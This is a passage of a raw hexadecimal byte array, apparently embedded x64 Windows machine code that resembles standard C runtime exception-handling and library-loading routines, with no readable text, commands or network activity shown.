0x89, 0x4d, 0x97, 0x45, 0x33, 0xc9, 0x4c, 0x89, 0x45, 0xaf, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x89, 0x55, 0xbf, 0x49, 0x8b, 0x12, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xc7, 0x45, 0xcf, 0x20, 0x5, 0x93, 0x19, 0xff, 0x15, 0x2e, 0xc0, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0xf, 0x48, 0x33, 0xcc, 0xe8, 0xf2, 0xae, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xe0, 0x0, 0x0, 0x0, 0x5d, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x89, 0x11, 0xe8, 0xf3, 0xf9, 0xff, 0xff, 0x48, 0x3b, 0x58, 0x58, 0x73, 0xb, 0xe8, 0xe8, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0x48, 0x58, 0xeb, 0x2, 0x33, 0xc9, 0x48, 0x89, 0x4b, 0x8, 0xe8, 0xd7, 0xf9, 0xff, 0xff, 0x48, 0x89, 0x58, 0x58, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0xe8, 0xb6, 0xf9, 0xff, 0xff, 0x48, 0x3b, 0x78, 0x58, 0x75, 0x35, 0xe8, 0xab, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0x50, 0x58, 0x48, 0x85, 0xd2, 0x74, 0x27, 0x48, 0x8b, 0x5a, 0x8, 0x48, 0x3b, 0xfa, 0x74, 0xa, 0x48, 0x8b, 0xd3, 0x48, 0x85, 0xdb, 0x74, 0x16, 0xeb, 0xed, 0xe8, 0x8a, 0xf9, 0xff, 0xff, 0x48, 0x89, 0x58, 0x58, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x4e, 0x2b, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x6b, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0x40, 0x60, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x57, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0x40, 0x68, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x3e, 0xf9, 0xff, 0xff, 0x48, 0x89, 0x58, 0x60, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x26, 0xf9, 0xff, 0xff, 0x48, 0x89, 0x58, 0x68, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x68, 0x18, 0x48, 0x89, 0x70, 0x20, 0x57, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0x59, 0x8, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xf0, 0x48, 0x89, 0x50, 0x8, 0x48, 0x8b, 0xe9, 0xe8, 0xf2, 0xf8, 0xff, 0xff, 0x48, 0x89, 0x58, 0x60, 0x48, 0x8b, 0x5d, 0x38, 0xe8, 0xe5, 0xf8, 0xff, 0xff, 0x48, 0x89, 0x58, 0x68, 0xe8, 0xdc, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x57, 0x38, 0x4c, 0x8b, 0xcf, 0x4c, 0x8b, 0xc6, 0x8b, 0xa, 0x48, 0x8d, 0x54, 0x24, 0x50, 0x48, 0x3, 0x48, 0x60, 0x33, 0xc0, 0x88, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x30, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x48, 0x8b, 0xcd, 0xe8, 0xb7, 0xf, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x58, 0x48, 0x8b, 0x6c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xf9, 0x4c, 0x8d, 0x3d, 0xa3, 0xcd, 0xff, 0xff, 0x49, 0x83, 0xce, 0xff, 0x4d, 0x8b, 0xe1, 0x49, 0x8b, 0xe8, 0x4c, 0x8b, 0xea, 0x49, 0x8b, 0x84, 0xff, 0x58, 0x9d, 0x1, 0x0, 0x90, 0x49, 0x3b, 0xc6, 0xf, 0x84, 0xeb, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0xf, 0x85, 0xe4, 0x0, 0x0, 0x0, 0x4d, 0x3b, 0xc1, 0xf, 0x84, 0xd1, 0x0, 0x0, 0x0, 0x8b, 0x75, 0x0, 0x49, 0x8b, 0x9c, 0xf7, 0x40, 0x9d, 0x1, 0x0, 0x90, 0x48, 0x85, 0xdb, 0x74, 0xb, 0x49, 0x3b, 0xde, 0xf, 0x85, 0x99, 0x0, 0x0, 0x0, 0xeb, 0x6b, 0x4d, 0x8b, 0xbc, 0xf7, 0xd8, 0x1, 0x1, 0x0, 0x33, 0xd2, 0x49, 0x8b, 0xcf, 0x41, 0xb8, 0x0, 0x8, 0x0, 0x0, 0xff, 0x15, 0x8d, 0xbe, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x56, 0xff, 0x15, 0x1f, 0xbe, 0x0, 0x0, 0x83, 0xf8, 0x57, 0x75, 0x2d, 0x44, 0x8d, 0x43, 0x7, 0x49, 0x8b, 0xcf, 0x48, 0x8d, 0x15, 0xa4, 0xcf, 0x0, 0x0, 0xe8, 0x9f, 0x2b, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x16, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x49, 0x8b, 0xcf, 0xff, 0x15, 0x55, 0xbe, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x1e, 0x49, 0x8b, 0xc6, 0x4c, 0x8d, 0x3d, 0xf3, 0xcc, 0xff, 0xff, 0x49, 0x87, 0x84, 0xf7, 0x40, 0x9d, 0x1, 0x0, 0x48, 0x83, 0xc5, 0x4, 0x49, 0x3b, 0xec, 0xe9, 0x67, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xc3, 0x4c, 0x8d, 0x3d, 0xd5, 0xcc, 0xff, 0xff, 0x49, 0x87, 0x84, 0xf7, 0x40, 0x9d, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x9, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xff, 0xbd, 0x0, 0x0, 0x49, 0x8b, 0xd5, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xfb, 0xbd, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xd, 0x48, 0x8b, 0xc8, 0x49, 0x87, 0x8c, 0xff, 0x58, 0x9d, 0x1, 0x0, 0xeb, 0xa, 0x4d, 0x87, 0xb4, 0xff, 0x58, 0x9d, 0x1, 0x0, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x4c, 0x8d, 0xd, 0x8, 0xcf, 0x0, 0x0, 0x33, 0xc9, 0x4c, 0x8d, 0x5, 0xf7, 0xce, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xf8, 0xce, 0x0, 0x0, 0xe8, 0x8b, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0xf, 0x48, 0x8b, 0xcb, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0xff, 0xbe, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0x53, 0xbd, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0x4c, 0x8d, 0xd, 0xd9, 0xce, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0xc5, 0xce, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xc6, 0xce, 0x0, 0x0, 0xe8, 0x41, 0xfe, 0xff, 0xff, 0x8b, 0xcb, 0x48, 0x85, 0xc0, 0x74, 0xc, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0xb6, 0xbe, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0x22, 0xbd, 0x0, 0x0, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0x4c, 0x8d, 0xd, 0xa1, 0xce, 0x0, 0x0, 0xb9, 0x2, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0x8d, 0xce, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x8e, 0xce, 0x0, 0x0, 0xe8, 0xf9, 0xfd, 0xff, 0xff, 0x8b, 0xcb, 0x48, 0x85, 0xc0, 0x74, 0xc, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0x6e, 0xbe, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0xca, 0xbc, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x4c, 0x8d, 0xd, 0x6c, 0xce, 0x0, 0x0, 0x8b, 0xf9, 0x48, 0x8d, 0x15, 0x63, 0xce, 0x0, 0x0, 0xb9, 0x3, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0x4f, 0xce, 0x0, 0x0, 0xe8, 0xaa, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0xd3, 0x8b, 0xcf, 0x48, 0x85, 0xc0, 0x74, 0x8, 0xff, 0x15, 0x22, 0xbe, 0x0, 0x0, 0xeb, 0x6, 0xff, 0x15, 0x8a, 0xbc, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x41, 0x8b, 0xf0, 0x4c, 0x8d, 0xd, 0x2b, 0xce, 0x0, 0x0, 0x8b, 0xda, 0x4c, 0x8d, 0x5, 0x1a, 0xce, 0x0, 0x0, 0x48, 0x8b, 0xf9, 0x48, 0x8d, 0x15, 0x18, 0xce, 0x0, 0x0, 0xb9, 0x4, 0x0, 0x0, 0x0, 0xe8, 0x4e, 0xfd, 0xff, 0xff, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0x48, 0x85, 0xc0, 0x74, 0xb, 0x44, 0x8b, 0xc6, 0xff, 0x15, 0xc3, 0xbd, 0x0, 0x0, 0xeb, 0x6, 0xff, 0x15, 0x13, 0xbc, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x4d, 0x63, 0x48, 0x1c, 0x4d, 0x8b, 0xd0, 0x48, 0x8b, 0x1, 0x41, 0x8b, 0x4, 0x1, 0x83, 0xf8, 0xfe, 0x75, 0xb, 0x4c, 0x8b, 0x2, 0x49, 0x8b, 0xca, 0xe8, 0x82, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0x49, 0x8b, 0xd8, 0xe8, 0x65, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x8, 0x48, 0x63, 0x43, 0x1c, 0x48, 0x89, 0x4c, 0x24, 0x40, 0x8b, 0x44, 0x8, 0x4, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x63, 0x52, 0x1c, 0x48, 0x8b, 0x1, 0x44, 0x89, 0x4, 0x2, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x41, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0xe8, 0x26, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x8, 0x48, 0x63, 0x43, 0x1c, 0x48, 0x89, 0x4c, 0x24, 0x40, 0x3b, 0x7c, 0x8, 0x4, 0x7e, 0x4, 0x89, 0x7c, 0x8, 0x4, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x4c, 0x8b, 0x2, 0xe9, 0x0, 0x0, 0x0, 0x0, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd8, 0x48, 0x85, 0xc9, 0x74, 0x52, 0x4c, 0x63, 0x59, 0x18, 0x4c, 0x8b, 0x52, 0x8, 0x4b, 0x8d, 0x4, 0x13, 0x48, 0x85, 0xc0, 0x74, 0x41, 0x44, 0x8b, 0x41, 0x14, 0x45, 0x33, 0xc9, 0x45, 0x85, 0xc0, 0x74, 0x30, 0x4b, 0x8d, 0xc, 0xcb, 0x4a, 0x63, 0x14, 0x11, 0x49, 0x3, 0xd2, 0x48, 0x3b, 0xda, 0x72, 0x8, 0x41, 0xff, 0xc1, 0x45, 0x3b, 0xc8, 0x72, 0xe8, 0x45, 0x85, 0xc9, 0x74, 0x13, 0x41, 0x8d, 0x49, 0xff, 0x49, 0x8d, 0x4, 0xcb, 0x42, 0x8b, 0x44, 0x10, 0x4, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x83, 0xc8, 0xff, 0xeb, 0xf5, 0xe8, 0x83, 0x26, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x4d, 0x8b, 0xf1, 0x49, 0x8b, 0xd8, 0x48, 0x8b, 0xf2, 0x4c, 0x8b, 0xe9, 0x33, 0xff, 0x41, 0x39, 0x78, 0x4, 0x74, 0xf, 0x4d, 0x63, 0x78, 0x4, 0xe8, 0xfe, 0xfa, 0xff, 0xff, 0x49, 0x8d, 0x14, 0x7, 0xeb, 0x6, 0x48, 0x8b, 0xd7, 0x44, 0x8b, 0xff, 0x48, 0x85, 0xd2, 0xf, 0x84, 0x77, 0x1, 0x0, 0x0, 0x45, 0x85, 0xff, 0x74, 0x11, 0xe8, 0xdf, 0xfa, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x48, 0x63, 0x43, 0x4, 0x48, 0x3, 0xc8, 0xeb, 0x3, 0x48, 0x8b, 0xcf, 0x40, 0x38, 0x79, 0x10, 0xf, 0x84, 0x54, 0x1, 0x0, 0x0, 0x39, 0x7b, 0x8, 0x75, 0x8, 0x39, 0x3b, 0xf, 0x8d, 0x47, 0x1, 0x0, 0x0, 0x39, 0x3b, 0x7c, 0xa, 0x48, 0x63, 0x43, 0x8, 0x48, 0x3, 0x6, 0x48, 0x8b, 0xf0, 0xf6, 0x3, 0x80, 0x74, 0x32, 0x41, 0xf6, 0x6, 0x10, 0x74, 0x2c, 0x48, 0x8b, 0x5, 0x61, 0x65, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x20, 0xff, 0x15, 0xf6, 0xbb, 0x0, 0x0, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x2f, 0x1, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0x26, 0x1, 0x0, 0x0, 0x48, 0x89, 0x6, 0x48, 0x8b, 0xc8, 0xeb, 0x5f, 0xf6, 0x3, 0x8, 0x74, 0x1b, 0x49, 0x8b, 0x4d, 0x28, 0x48, 0x85, 0xc9, 0xf, 0x84, 0x11, 0x1, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0x8, 0x1, 0x0, 0x0, 0x48, 0x89, 0xe, 0xeb, 0x3f, 0x41, 0xf6, 0x6, 0x1, 0x74, 0x4a, 0x49, 0x8b, 0x55, 0x28, 0x48, 0x85, 0xd2, 0xf, 0x84, 0xf5, 0x0, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0xec, 0x0, 0x0, 0x0, 0x4d, 0x63, 0x46, 0x14, 0x48, 0x8b, 0xce, 0xe8, 0x64, 0xe6, 0xff, 0xff, 0x41, 0x83, 0x7e, 0x14, 0x8, 0xf, 0x85, 0xab, 0x0, 0x0, 0x0, 0x48, 0x39, 0x3e, 0xf, 0x84, 0xa2, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xe, 0x49, 0x8d, 0x56, 0x8, 0xe8, 0x3c, 0xf0, 0xff, 0xff, 0x48, 0x89, 0x6, 0xe9, 0x8e, 0x0, 0x0, 0x0, 0x41, 0x39, 0x7e, 0x18, 0x74, 0xf, 0x49, 0x63, 0x5e, 0x18, 0xe8, 0x9, 0xfa, 0xff, 0xff, 0x48, 0x8d, 0xc, 0x3, 0xeb, 0x5, 0x48, 0x8b, 0xcf, 0x8b, 0xdf, 0x48, 0x85, 0xc9, 0x75, 0x34, 0x49, 0x39, 0x7d, 0x28, 0xf, 0x84, 0x94, 0x0, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0x8b, 0x0, 0x0, 0x0, 0x49, 0x63, 0x5e, 0x14, 0x49, 0x8d, 0x56, 0x8, 0x49, 0x8b, 0x4d, 0x28, 0xe8, 0xf1, 0xef, 0xff, 0xff, 0x48, 0x8b, 0xd0, 0x4c, 0x8b, 0xc3, 0x48, 0x8b, 0xce, 0xe8, 0xeb, 0xe5, 0xff, 0xff, 0xeb, 0x3b, 0x49, 0x39, 0x7d, 0x28, 0x74, 0x69, 0x48, 0x85, 0xf6, 0x74, 0x64, 0x85, 0xdb, 0x74, 0x11, 0xe8, 0xb1, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x49, 0x63, 0x46, 0x18, 0x48, 0x3, 0xc8, 0xeb, 0x3, 0x48, 0x8b, 0xcf, 0x48, 0x85, 0xc9, 0x74, 0x47, 0x41, 0x8a, 0x6, 0x24, 0x4, 0xf6, 0xd8, 0x1b, 0xc9, 0xf7, 0xd9, 0xff, 0xc1, 0x8b, 0xf9, 0x89, 0x4c, 0x24, 0x20, 0x8b, 0xc7, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x74, 0x24, 0x58, 0x48, 0x8b, 0x7c, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0xc3, 0xe8, 0x9d, 0x24, 0x0, 0x0, 0xe8, 0x98, 0x24, 0x0, 0x0, 0xe8, 0x93, 0x24, 0x0, 0x0, 0xe8, 0x8e, 0x24, 0x0, 0x0, 0xe8, 0x89, 0x24, 0x0, 0x0, 0x90, 0xe8, 0x83, 0x24, 0x0, 0x0, 0x90, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x4c, 0x8b, 0xf1, 0x33, 0xdb, 0x41, 0x39, 0x18, 0x7d, 0x5, 0x48, 0x8b, 0xf2, 0xeb, 0x7, 0x49, 0x63, 0x70, 0x8, 0x48, 0x3, 0x32, 0xe8, 0xcd, 0xfd, 0xff, 0xff, 0x83, 0xe8, 0x1, 0x74, 0x3c, 0x83, 0xf8, 0x1, 0x75, 0x67, 0x48, 0x8d, 0x57, 0x8, 0x49, 0x8b, 0x4e, 0x28, 0xe8, 0x1a, 0xef, 0xff, 0xff, 0x4c, 0x8b, 0xf0, 0x39, 0x5f, 0x18, 0x74, 0xc, 0xe8, 0xf1, 0xf8, 0xff, 0xff, 0x48, 0x63, 0x5f, 0x18, 0x48, 0x3, 0xd8, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xce, 0xe8, 0x7e, 0x12, 0x0, 0x0, 0xeb, 0x30, 0x48, 0x8d, 0x57, 0x8, 0x49, 0x8b, 0x4e, 0x28, 0xe8, 0xe3, 0xee, 0xff, 0xff, 0x4c, 0x8b, 0xf0, 0x39, 0x5f, 0x18, 0x74, 0xc, 0xe8, 0xba, 0xf8, 0xff, 0xff, 0x48, 0x63, 0x5f, 0x18, 0x48, 0x3, 0xd8, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xce, 0xe8, 0x41, 0x12, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xe8, 0xc1, 0x23, 0x0, 0x0, 0x90, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x4c, 0x89, 0x40, 0x18, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x60, 0x4c, 0x8b, 0xac, 0x24, 0xc0, 0x0, 0x0, 0x0, 0x4d, 0x8b, 0xf9, 0x4c, 0x8b, 0xe2, 0x4c, 0x8d, 0x48, 0x10, 0x48, 0x8b, 0xe9, 0x4d, 0x8b, 0xc5, 0x49, 0x8b, 0xd7, 0x49, 0x8b, 0xcc, 0xe8, 0x97, 0xf4, 0xff, 0xff, 0x4c, 0x8b, 0x8c, 0x24, 0xd0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xf0, 0x48, 0x8b, 0xb4, 0x24, 0xc8, 0x0, 0x0, 0x0, 0x4d, 0x85, 0xc9, 0x74, 0xe, 0x4c, 0x8b, 0xc6, 0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xcd, 0xe8, 0xdd, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x8c, 0x24, 0xd8, 0x0, 0x0, 0x0, 0x8b, 0x59, 0x8, 0x8b, 0x39, 0xe8, 0xff, 0xf7, 0xff, 0xff, 0x48, 0x63, 0x4e, 0xc, 0x4d, 0x8b, 0xce, 0x4c, 0x8b, 0x84, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x48, 0x3, 0xc1, 0x8a, 0x8c, 0x24, 0xf8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd5, 0x88, 0x4c, 0x24, 0x50, 0x49, 0x8b, 0xcc, 0x4c, 0x89, 0x7c, 0x24, 0x48, 0x48, 0x89, 0x74, 0x24, 0x40, 0x89, 0x5c, 0x24, 0x38, 0x89, 0x7c, 0x24, 0x30, 0x4c, 0x89, 0x6c, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x27, 0xf6, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0xa0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x60, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x6c, 0x24, 0xd8, 0x48, 0x81, 0xec, 0x28, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x5, 0x68, 0x57, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0x10, 0x48, 0x8b, 0xbd, 0x90, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xe2, 0x4c, 0x8b, 0xad, 0xa8, 0x0, 0x0, 0x0, 0x4d, 0x8b, 0xf8, 0x4c, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8b, 0xd9, 0x48, 0x89, 0x55, 0x80, 0x4c, 0x8b, 0xc7, 0x49, 0x8b, 0xcc, 0x4c, 0x89, 0x6d, 0x98, 0x49, 0x8b, 0xd1, 0xc6, 0x44, 0x24, 0x60, 0x0, 0x49, 0x8b, 0xf1, 0xe8, 0xdf, 0xe, 0x0, 0x0, 0x44, 0x8b, 0xf0, 0x83, 0xf8, 0xff, 0xf, 0x8c, 0x52, 0x4, 0x0, 0x0, 0x3b, 0x47, 0x4, 0xf, 0x8d, 0x49, 0x4, 0x0, 0x0, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0xf, 0x85, 0xc9, 0x0, 0x0, 0x0, 0x83, 0x7b, 0x18, 0x4, 0xf, 0x85, 0xbf, 0x0, 0x0, 0x0, 0x8b, 0x43, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0xf, 0x87, 0xae, 0x0, 0x0, 0x0, 0x48, 0x83, 0x7b, 0x30, 0x0, 0xf, 0x85, 0xa3, 0x0, 0x0, 0x0, 0xe8, 0x67, 0xf0, 0xff, 0xff, 0x48, 0x83, 0x78, 0x20, 0x0, 0xf, 0x84, 0xa0, 0x3, 0x0, 0x0, 0xe8, 0x57, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0x58, 0x20, 0xe8, 0x4e, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x38, 0xc6, 0x44, 0x24, 0x60, 0x1, 0x4c, 0x8b, 0x78, 0x28, 0x4c, 0x89, 0x7c, 0x24, 0x68, 0xe8, 0x3, 0xf7, 0xff, 0xff, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x1e, 0x83, 0x7b, 0x18, 0x4, 0x75, 0x18, 0x8b, 0x43, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0x77, 0xb, 0x48, 0x83, 0x7b, 0x30, 0x0, 0xf, 0x84, 0xbc, 0x3, 0x0, 0x0, 0xe8, 0xc, 0xf0, 0xff, 0xff, 0x48, 0x83, 0x78, 0x38, 0x0, 0x74, 0x3c, 0xe8, 0x0, 0xf0, 0xff, 0xff, 0x4c, 0x8b, 0x78, 0x38, 0xe8, 0xf7, 0xef, 0xff, 0xff, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xcb, 0x48, 0x83, 0x60, 0x38, 0x0, 0xe8, 0xab, 0xe, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x15, 0x49, 0x8b, 0xcf, 0xe8, 0x8f, 0xf, 0x0, 0x0, 0x84, 0xc0, 0xf, 0x84, 0x5b, 0x3, 0x0, 0x0, 0xe9, 0x32, 0x3, 0x0, 0x0, 0x4c, 0x8b, 0x7c, 0x24, 0x68, 0x48, 0x8b, 0x46, 0x8, 0x48, 0x89, 0x45, 0xc0, 0x48, 0x89, 0x7d, 0xb8, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0xf, 0x85, 0xac, 0x2, 0x0, 0x0, 0x83, 0x7b, 0x18, 0x4, 0xf, 0x85, 0xa2, 0x2, 0x0, 0x0, 0x8b, 0x43, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0xf, 0x87, 0x91, 0x2, 0x0, 0x0, 0x45, 0x33, 0xed, 0x44, 0x39, 0x6f, 0xc, 0xf, 0x86, 0xb5, 0x1, 0x0, 0x0, 0x8b, 0x85, 0xa0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x55, 0xb8, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8d, 0x4d, 0xd8, 0x4c, 0x8b, 0xce, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x45, 0x8b, 0xc6, 0xe8, 0x1f, 0xf3, 0xff, 0xff, 0xf, 0x10, 0x45, 0xd8, 0xf3, 0xf, 0x7f, 0x45, 0xc8, 0x66, 0xf, 0x73, 0xd8, 0x8, 0x66, 0xf, 0x7e, 0xc0, 0x3b, 0x45, 0xf0, 0xf, 